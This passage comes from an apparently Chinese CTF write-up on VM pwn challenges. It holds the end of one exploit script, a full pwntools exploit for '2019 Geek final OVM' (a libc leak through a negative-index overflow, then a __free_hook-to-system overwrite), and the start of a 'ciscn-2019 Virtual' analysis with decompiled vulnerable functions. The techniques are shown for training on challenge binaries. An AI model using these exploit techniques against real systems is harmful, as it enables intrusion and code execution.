punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RCX_I<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>SYSCALL<span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RAX_I<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook_addr <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>SYSCALL<span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>vm_shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read(0,bss,0x100)</span>rop <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#open(bss,0)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read(3,bss,0x30)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#write(1,bss,0x30)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>setcontext_addr<span class="token operator">+</span><span class="token number">0x35</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> ropraw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'./flag\x00'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2019-Geek-finial-OVM"><a href="#2019-Geek-finial-OVM" class="headerlink" title="2019 Geek finial OVM"></a>2019 Geek finial OVM</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/4.png"></div>这是一道libc 2.27下的VM pwn题，canary没有开启，其它的保护全开<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><strong>memory地址是我们存放code的地方0x202060，regs是我们的寄存器一共有16个，PC指令是指令的index，自增1，sp是开辟的栈顶指针，开辟的stack在0x2420a0，comment在0x202040位置。之前没有注意到code存放在memory位置，所以发现后面的问题但是还是没想到怎么利用。tcl</strong></p><p>主函数中：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/5.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/6.png"></div>执行函数中：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/7.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/8.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/9.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/10.png"></div><p>很仔细的逆了一下午，指令的意思和格式也搞清楚了，就有点没注意到memory可控太可惜了。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>首先我们定位到0x30的指令，由于memory可控，那么reg也可控。我们定位到0x50的push指令，负整数溢出很容易发现。同时注意到pop指令的汇编：movsxd是带符号的，不太容易发现，不过发现后面push有明显的溢出也会进行尝试的。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/11.png"></div>注意到最后有个read和free功能：大概是向comment[0]内的地址写入0x18个字节，既然可以溢出那么同样也可以修改了。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/12.png"></div><p><strong>第一步：首先通过负数溢出将got表通过stack读入寄存器打印出来。<br>第二步：计算free_hook到函数printf的偏移，因为我们选择的是打印printf函数<br>第三步：修改对应的低四位的寄存器，高四位就不用改了<br>第四步：计算comment[0]和memory的偏移，通过stack再改一次，将freehook-8的地址写入到comment[0]中<br>第五步：写入/bin/sh;+p64(system)到comment[0]</strong><br>由于指令啥的是4位，所以比较麻烦，还是慢慢的把exp撸出来了。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ovm"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ovm"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>stack_addr <span class="token operator">=</span> <span class="token number">0x2420a0</span>reg_addr <span class="token operator">=</span> <span class="token number">0x242060</span>memory_add <span class="token operator">=</span> <span class="token number">0x202060</span>comment_add <span class="token operator">=</span> <span class="token number">0x202040</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>offset <span class="token operator">=</span> <span class="token punctuation">(</span>stack_addr<span class="token operator">-</span>write_got<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span>off_free_printf <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span>success<span class="token punctuation">(</span><span class="token string">"offset between free_hook and write is "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>off_free_printf<span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"offset between stack and write is "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [+] offset between free_hook and setbuf is 0x2dd7a8</span><span class="token comment" spellcheck="true"># [+] offset between stack and write is 0x10046</span>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x10041</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># store offset between stack and write</span>        <span class="token number">0x30050000</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># offset store in 5 reg</span>        <span class="token number">0x800d0005</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># make 0 reg sub 5 reg, -0x10041 will store in sp reg</span>        <span class="token number">0x60010000</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># printf addr low 4 bit in 1 regs，通过stack index的负数溢出pop入寄存器</span>        <span class="token number">0x60000000</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># printf addr high 4 bit in 0 regs</span>        <span class="token number">0x70020f06</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># reg 2 = 6</span>        off_free_printf<span class="token punctuation">,</span>        <span class="token number">0x30070002</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># offset hook and printf in reg 7</span>        <span class="token number">0x70080107</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># hook low 4 bit in reg 8</span>        <span class="token number">0x70020f0e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># reg 2 = 10</span>        memory_add<span class="token punctuation">,</span>        <span class="token number">0x300a0002</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># memory add in reg 10</span>        <span class="token number">0x70020f0e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># reg 2 = 13</span>        comment_add<span class="token punctuation">,</span>        <span class="token number">0x300b0002</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># comment add in reg 11</span>        <span class="token number">0x800d0b0a</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># offset comment and memory in sp</span>        <span class="token number">0x70090109</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># printf low 4 bit in 9 regs, the latter code will cover 1 reg</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># sp--</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x4008000d</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># copy hook low 4 bite in comment[0]</span>        <span class="token number">0x50000000</span><span class="token punctuation">,</span>        <span class="token number">0x4000000d</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># copy hook high 4 bite in comment[0]</span>        <span class="token number">0xe0000000</span>        <span class="token punctuation">]</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"PCPC: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"SP: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"SIZE: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p,"b *0x555555554cf9")</span><span class="token keyword">for</span> i <span class="token keyword">in</span> code<span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"R0: "</span><span class="token punctuation">)</span>high_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"R9: "</span><span class="token punctuation">)</span>low_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>print_addr <span class="token operator">=</span> <span class="token punctuation">(</span>high_addr<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>low_addrlibc<span class="token punctuation">.</span>address <span class="token operator">=</span> print_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb,attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"OVM?\n"</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 0x00007ffff7af4140</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ciscn-2019-Virtual"><a href="#ciscn-2019-Virtual" class="headerlink" title="ciscn-2019 Virtual"></a>ciscn-2019 Virtual</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/13.png"></div>GOT表可劫持，PIE没有开启<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>主函数：程序模拟了三个部分text代码段，stack栈，data区</p><pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  section_info <span class="token operator">*</span>stackAddr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  section_info <span class="token operator">*</span>textAddr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  section_info <span class="token operator">*</span>dataAddr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>StackDataChunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  <span class="token function">StartInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stackAddr <span class="token operator">=</span> <span class="token function">MallocFunc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  textAddr <span class="token operator">=</span> <span class="token function">MallocFunc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dataAddr <span class="token operator">=</span> <span class="token function">MallocFunc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  StackDataChunk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your program name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ReadFunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>name<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your instruction:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ReadFunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>StackDataChunk<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ParseIns</span><span class="token punctuation">(</span>textAddr<span class="token punctuation">,</span> StackDataChunk<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 解析指令,最先读入的指令放在最后</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your stack data:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ReadFunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>StackDataChunk<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ParseData</span><span class="token punctuation">(</span>stackAddr<span class="token punctuation">,</span> StackDataChunk<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 读数据，先读入的数据放最后面</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">ExeCommand</span><span class="token punctuation">(</span>textAddr<span class="token punctuation">,</span> stackAddr<span class="token punctuation">,</span> dataAddr<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DoSth</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>stackAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your Program Crash :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">free</span><span class="token punctuation">(</span>StackDataChunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">FreeFunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>textAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">FreeFunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>stackAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">FreeFunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>dataAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要功能如下：</p><ol><li>push 将stack上值取出放入data中</li><li>pop 将data上值取出放入stack中</li><li>add/sub/mul/div 从data取出两个值，相加/减/乘/除后放回data中</li><li>load 从data中读入一个值作为index，将buffer中这个index所对应位置的值写入data中</li><li>save 从data中读入一个值作为index，再从buffer中读一个值，写入data中这个index所对应的位置</li></ol><p>漏洞处：</p><p>load：</p><pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">LOAD</span><span class="token punctuation">(</span>section_info <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">MoveAToB</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">MoveBToA</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token operator">-></span>section_ptr <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token operator">-></span>idx <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>save:</p><pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">SAVE</span><span class="token punctuation">(</span>section_info <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">MoveAToB</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">MoveAToB</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token operator">-></span>idx <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token operator">-></span>section_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 